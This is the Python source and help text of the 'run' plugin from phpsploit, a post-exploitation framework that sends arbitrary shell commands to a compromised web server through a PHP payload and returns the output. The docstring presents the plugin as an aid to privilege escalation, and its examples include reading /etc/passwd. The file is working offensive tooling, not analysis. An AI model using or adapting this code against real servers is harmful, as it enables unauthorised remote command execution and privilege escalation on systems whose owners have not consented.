"""Execute a command on the server

SYNOPSIS:
    run "<SHELL COMMAND>"

DESCRIPTION:
    Most of the phpsploit plugins intend to simulate shell
    commands over obfuscated PHP implementations.
    Therefore, in a few remote servers, real command execution
    is not blocked, so using them would be a plus in the
    privilege escalation process.

    NOTE: This plugin is cross-platform compatible. Therefore,
    the additional feature below is only compatible on unix
    based servers:

    The command(s) list is wrapped through a path location
    checker. For example, running the command:
        `./do_something.sh`
    will in reality send that:
        `cd $PWD; ./do_something.sh; pwd`

    This feature allows user to run scripts from current $PWD
    without writing absolute path each time, which is harassing.
    It also updates $PWD after command execution is the final
    `pwd` command says our location has changed.

WARNING:
    Considering phpsploit's input parser, commands which
    contain quotes, semicolons, and other chars that could be
    interpreted by the framework MUST be enquoted to be
    interpreted as a single argument. For example:
      > run echo 'foo bar' > /tmp/foobar; cat /etc/passwd
    In this case, quotes and semicolons will be interpreted by
    the framwework, so the correct syntax is:
      > run "echo 'foo bar' > /tmp/foobar; cat /etc/passwd"

EXAMPLES:
    > run ipconfig /all
      - Run the 'ipconfig' tool on windows servers
    > run ls -la /etc
      - List any file in the /etc/ directory on *nix systems
    > run "cat /etc/passwd | grep root; ls /tmp"
      - Just a multi command, which must be enquoted because
        of the semicolon (see WARNING)

AUTHOR:
    nil0x42 <http://goo.gl/kb2wf>
"""

import sys

from api import plugin
from api import server
from api import environ

if len(plugin.argv) < 2:
    sys.exit(plugin.help)

if environ['PLATFORM'].startswith("win"):
    cmd_sep = " & "
else:
    cmd_sep = " ; "

cmd_list = []

# This small hack enables STDERR display on unix platforms
if not environ['PLATFORM'].lower().startswith("win"):
    cmd_list.append('exec 2>&1')

# Change directory to $PWD before commands execution
cmd_list.append('cd ' + environ['PWD'])

# Add commands (plugin arguments) to cmd_list
cmd_list.append(" ".join(plugin.argv[1:]))

# Prepare payload
payload = server.payload.Payload("payload.php")
payload['CMD'] = cmd_sep.join(cmd_list).strip()

# Patch for unix platforms to update $PWD if changed (1/2)
if not environ['PLATFORM'].lower().startswith("win"):
    if payload["CMD"][-1] not in ";&":
        payload["CMD"] += " ; "
    payload['CMD'] += "echo ; echo AzXB `pwd` AzXB"

print("[#] raw command: %r" % payload['CMD'])

output = payload.send()
lines = output.splitlines()

if environ['PLATFORM'].lower().startswith("win"):
    for line in lines:
        print(line)
    sys.exit(0)

if not lines:
    sys.exit("No output received")

new_pwd = lines.pop()

try:
    assert new_pwd.startswith("AzXB ")
    assert new_pwd.endswith(" AzXB")
    new_pwd = new_pwd[5:-5]
    assert server.path.isabs(new_pwd)
    environ['PWD'] = new_pwd
    if lines and not lines[-1]:
        lines.pop(-1)
    for line in lines:
        print(line)
except AssertionError:
    print("[-] Couldn't retrieve new $PWD.")
    print("[-] Raw output:")
    print(output)
    sys.exit(1)
